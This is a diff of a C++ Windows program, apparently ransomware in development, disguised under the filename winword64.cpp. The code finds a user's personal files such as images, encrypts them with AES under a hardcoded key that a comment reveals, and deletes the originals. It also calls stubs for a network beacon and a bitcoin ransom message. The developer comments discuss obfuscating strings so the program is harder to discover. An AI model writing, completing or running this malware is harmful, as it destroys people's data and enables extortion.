@@ -1,6 +1,13 @@
 // winword64.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 
+//
+// The encryption/decryption key is:
+//    "Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"
+//
+// which is a Base64 encode of "ChrisClarissaSamanthaSkylar"
+//
+
 #include <fstream>
 #include <string>
 #include <iostream>
@@ -16,6 +23,114 @@ namespace fs = std::experimental::filesystem;
 
 bool g_Verbosity = false;
 bool g_Decrypt = false;
+
+// Function Declarations
+DWORD FindFiles();
+DWORD FindEncryptedFiles(std::string decryptionKey);
+bool EncryptAndDeleteThisFile(std::string path);
+bool DecryptThisFile(std::string path, std::string decryptionKey);
+bool ExcludePath(std::string checkString);
+bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key);
+bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key);
+void SendBeacon();
+void RansomMessage();
+
+int main(int argc, char* argv[])
+{ 
+	std::string keyDecrypt = "";
+	std::string Banner1 = "We";
+	std::string Banner2 = "lc";
+	std::string Banner3 = "om";
+	std::string Banner4 = "e ";
+	std::string Banner5 = "to";
+	std::string Banner6 = " t";
+	std::string Banner7 = "he";
+	std::string Banner8 = " M";
+	std::string Banner9 = "at";
+	std::string Banner10 = "ri";
+	std::string Banner11 = "x!";
+	std::string Banner12 = "!!";
+	std::string Banner13 = " ...";
+	// Obfuscating this string
+	std::string BannerFinal = Banner1.append(Banner2).append(Banner3).append(Banner4).append(Banner5).append(Banner6).append(Banner7).append(Banner8).append(Banner9).append(Banner10).append(Banner11).append(Banner12).append(Banner13);
+
+    std::cout << BannerFinal << std::endl;
+
+	//if (argc > 1)
+	//{
+	//	if (std::string(argv[1]) == "/v")
+	//	{
+	//		g_Verbosity = true;
+	//	}
+	//}
+
+	for (int i = 1; i < argc; ++i) {
+		if (std::string(argv[i]) == "/v") 
+		{
+			g_Verbosity = true;
+		}
+		else if (std::string(argv[i]) == "/d")
+		{
+			if (i + 1 < argc)
+			{ 
+				g_Decrypt = true;
+
+				keyDecrypt = argv[++i];
+			}
+			else
+			{ 
+				// Uh-oh, there was no argument to the destination option.
+			}
+		}
+	}
+
+
+	if (g_Verbosity)
+	{
+		std::cout << "Verbosity: Enabled" << std::endl;
+		std::cout << "Decrypt: " << g_Decrypt << std::endl;
+		std::cout << "keyDecrypt: " << keyDecrypt << std::endl;
+	}
+
+	// Encrypt or Decrypt files?
+	if (!g_Decrypt)
+	{
+		// Finds, Encrypts, and Deletes important personal files
+		FindFiles();
+	}
+	else
+	{
+		// Finds .encrypted files, and decrypts them
+		std::cout << "You entered the decryption key: " << keyDecrypt << std::endl;
+
+		FindEncryptedFiles(keyDecrypt);
+	}
+
+	// Send network beacon to report ransom completed
+	SendBeacon();
+
+	// Display message to user demanding bitcoin payment 
+	RansomMessage();
+
+	// Question: Do we care about providing a decryption option?
+
+	// Question: For the final version, I think we should comment out all 
+	// of the std::cout calls in all supporting functions to minimize the 
+	// discoverable strings.  Thoughts?
+
+	if (!g_Decrypt)
+	{
+		std::cout << std::endl << "All Your Files Are Belong To Us!!! :\\" << std::endl;
+	}
+	else
+	{
+		std::cout << std::endl << "All Your Files Are Belong To You!!! :\\" << std::endl;
+	}
+}
+
+//
+// Supporting functions
+//
 
 bool ExcludePath(std::string checkString)
 {
@@ -68,7 +183,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	}
 
 	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
-	if (hInputFile == INVALID_HANDLE_VALUE) 
+	if (hInputFile == INVALID_HANDLE_VALUE)
 	{
 		if (g_Verbosity)
 			std::cout << "Cannot open input file!" << std::endl;
@@ -77,7 +192,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	}
 
 	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (hOutputFile == INVALID_HANDLE_VALUE) 
+	if (hOutputFile == INVALID_HANDLE_VALUE)
 	{
 		if (g_Verbosity)
 			std::cout << "Cannot open output file!" << std::endl;
@@ -90,7 +205,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
 	HCRYPTPROV hCryptProvider;
 
-	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) 
+	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
 	{
 		dwStatus = GetLastError();
 		if (g_Verbosity)
@@ -102,7 +217,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	}
 
 	HCRYPTHASH hCryptHash;
-	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash)) 
+	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash))
 	{
 		dwStatus = GetLastError();
 		if (g_Verbosity)
@@ -113,7 +228,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 		return false;
 	}
 
-	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0)) 
+	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
 	{
 		DWORD err = GetLastError();
 		if (g_Verbosity)
@@ -125,7 +240,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 		//std::cout << "CryptHashData Success! " << std::endl;
 
 	HCRYPTKEY hCryptKey;
-	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey)) 
+	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey))
 	{
 		dwStatus = GetLastError();
 		if (g_Verbosity)
@@ -137,7 +252,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	}
 	//if (g_Verbosity)
 		//std::cout << "CryptDeriveKey Success! " << std::endl;
-		
+
 	const size_t chunkSize = BLOCK_LEN;
 	BYTE chunk[chunkSize] = { 0 };
 	DWORD outputLength = 0;
@@ -145,16 +260,16 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	DWORD readTotalSize = 0;
 	DWORD inputSize = GetFileSize(hInputFile, NULL);
 
-	while (bResult = ReadFile(hInputFile, chunk, chunkSize, &outputLength, NULL)) 
+	while (bResult = ReadFile(hInputFile, chunk, chunkSize, &outputLength, NULL))
 	{
-		if (0 == outputLength) 
+		if (0 == outputLength)
 		{
 			break;
 		}
 
 		readTotalSize += outputLength;
 
-		if (readTotalSize == inputSize) 
+		if (readTotalSize == inputSize)
 		{
 			isFinal = TRUE;
 			if (g_Verbosity)
@@ -162,7 +277,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 		}
 
 		// Encrypt data
-		if (!CryptEncrypt(hCryptKey, NULL, isFinal, 0, chunk, &outputLength, chunkSize)) 
+		if (!CryptEncrypt(hCryptKey, NULL, isFinal, 0, chunk, &outputLength, chunkSize))
 		{
 			if (g_Verbosity)
 				std::cout << "CryptEncrypt failed :(" << std::endl;
@@ -170,7 +285,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 		}
 
 		DWORD written = 0;
-		if (!WriteFile(hOutputFile, chunk, outputLength, &written, NULL)) 
+		if (!WriteFile(hOutputFile, chunk, outputLength, &written, NULL))
 		{
 			if (g_Verbosity)
 				std::cout << "WriteFile(output file) failed :(" << std::endl;
@@ -348,7 +463,7 @@ bool EncryptAndDeleteThisFile(std::string path)
 
 	if (g_Verbosity)
 		std::cout << "Encrypt result: " << fEncrypted << std::endl;
-	
+
 	fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
 	if (!fDeleted)
 	{
@@ -381,7 +496,7 @@ bool DecryptThisFile(std::string path, std::string decryptionKey)
 	bool fDeleted = false;
 
 	std::string pathRestoreTargetFile = path;
-	pathRestoreTargetFile.erase(pathRestoreTargetFile.end()-10, pathRestoreTargetFile.end());
+	pathRestoreTargetFile.erase(pathRestoreTargetFile.end() - 10, pathRestoreTargetFile.end());
 
 	fDecrypted = Decryptor(path, pathRestoreTargetFile, decryptionKey);
 
@@ -390,7 +505,7 @@ bool DecryptThisFile(std::string path, std::string decryptionKey)
 		std::cout << "Decryption result: " << fDecrypted << std::endl;
 		//std::cout << "Restore target file path: " << pathRestoreTargetFile << std::endl;
 	}
-		
+
 	//TODO : if fDecrypted do delete
 	//fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
 	//if (!fDeleted)
@@ -472,8 +587,8 @@ DWORD FindFiles()
 		{
 			continue; // Excluding path 
 		}
-		
-		if (entry.path().extension()==jpg ||
+
+		if (entry.path().extension() == jpg ||
 			entry.path().extension() == jpeg ||
 			entry.path().extension() == png ||
 			entry.path().extension() == gif ||
@@ -579,97 +694,4 @@ void SendBeacon()
 void RansomMessage()
 {
 	// TODO
-}
-
-int main(int argc, char* argv[])
-{ 
-	std::string keyDecrypt = "";
-	std::string Banner1 = "We";
-	std::string Banner2 = "lc";
-	std::string Banner3 = "om";
-	std::string Banner4 = "e ";
-	std::string Banner5 = "to";
-	std::string Banner6 = " t";
-	std::string Banner7 = "he";
-	std::string Banner8 = " M";
-	std::string Banner9 = "at";
-	std::string Banner10 = "ri";
-	std::string Banner11 = "x!";
-	std::string Banner12 = "!!";
-	std::string Banner13 = " ...";
-	// Obfuscating this string
-	std::string BannerFinal = Banner1.append(Banner2).append(Banner3).append(Banner4).append(Banner5).append(Banner6).append(Banner7).append(Banner8).append(Banner9).append(Banner10).append(Banner11).append(Banner12).append(Banner13);
-
-    std::cout << BannerFinal << std::endl;
-
-	//if (argc > 1)
-	//{
-	//	if (std::string(argv[1]) == "/v")
-	//	{
-	//		g_Verbosity = true;
-	//	}
-	//}
-
-	for (int i = 1; i < argc; ++i) {
-		if (std::string(argv[i]) == "/v") 
-		{
-			g_Verbosity = true;
-		}
-		else if (std::string(argv[i]) == "/d")
-		{
-			if (i + 1 < argc)
-			{ 
-				g_Decrypt = true;
-
-				keyDecrypt = argv[++i];
-			}
-			else
-			{ 
-				// Uh-oh, there was no argument to the destination option.
-			}
-		}
-	}
-
-
-	if (g_Verbosity)
-	{
-		std::cout << "Verbosity: Enabled" << std::endl;
-		std::cout << "Decrypt: " << g_Decrypt << std::endl;
-		std::cout << "keyDecrypt: " << keyDecrypt << std::endl;
-	}
-
-	// Encrypt or Decrypt files?
-	if (!g_Decrypt)
-	{
-		// Finds, Encrypts, and Deletes important personal files
-		FindFiles();
-	}
-	else
-	{
-		// Finds .encrypted files, and decrypts them
-		std::cout << "You entered the decryption key: " << keyDecrypt << std::endl;
-
-		FindEncryptedFiles(keyDecrypt);
-	}
-
-	// Send network beacon to report ransom completed
-	SendBeacon();
-
-	// Display message to user demanding bitcoin payment 
-	RansomMessage();
-
-	// Question: Do we care about providing a decryption option?
-
-	// Question: For the final version, I think we should comment out all 
-	// of the std::cout calls in all supporting functions to minimize the 
-	// discoverable strings.  Thoughts?
-
-	if (!g_Decrypt)
-	{
-		std::cout << std::endl << "All Your Files Are Belong To Us!!! :\\" << std::endl;
-	}
-	else
-	{
-		std::cout << std::endl << "All Your Files Are Belong To You!!! :\\" << std::endl;
-	}
 }
